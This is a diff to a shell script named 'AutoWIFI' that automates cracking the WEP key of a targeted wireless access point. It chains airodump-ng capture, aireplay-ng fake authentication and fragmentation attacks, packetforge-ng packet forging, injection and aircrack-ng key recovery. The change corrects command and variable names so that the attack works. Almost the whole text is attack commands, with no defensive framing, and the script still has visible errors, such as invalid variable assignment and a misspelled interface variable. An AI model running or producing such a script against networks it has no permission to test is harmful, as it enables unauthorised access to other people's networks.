@@ -1,5 +1,4 @@
 echo "AutoWIFI"
-echo "updating ..."
 echo "WELCOME . . . . "
 $AP=""
 $VIC=""
@@ -29,8 +28,8 @@ echo "testing WEP fragramention ...."
 sudo xterm -geometry "airodump-ng  --bssid $AP  -w frag $interface"
 sudo xterm -geometry "150x50+50+0" -e "aireplay-ng -1 60 -e $essid -b $AP -h $MAC $interface"
 sudo xterm -geometry "150x50+50+0" -e  "aireplay-ng -5 -b $AP -h $MAC $interface"
-sudo xterm -geometry "150x50+50+0" -e "packetforge-ng -0 -a $AP -h $mon -l 192.168.100 -k 192.168.1.255 -y *.xor  -w inject.cap"
-sudo xterm -geometry "aireplay -2 -r inject.cap $inteface"
+sudo xterm -geometry "150x50+50+0" -e "packetforge-ng -0 -a $AP -h $MAC -l 192.168.100 -k 192.168.1.255 -y *.xor  -w inject.cap"
+sudo xterm -geometry "aireplay-ng -2 -r inject.cap $inteface"
 sudo xterm -geometry "150x50+50+0" -e "aircrack-ng frag-01.cap"
 
 
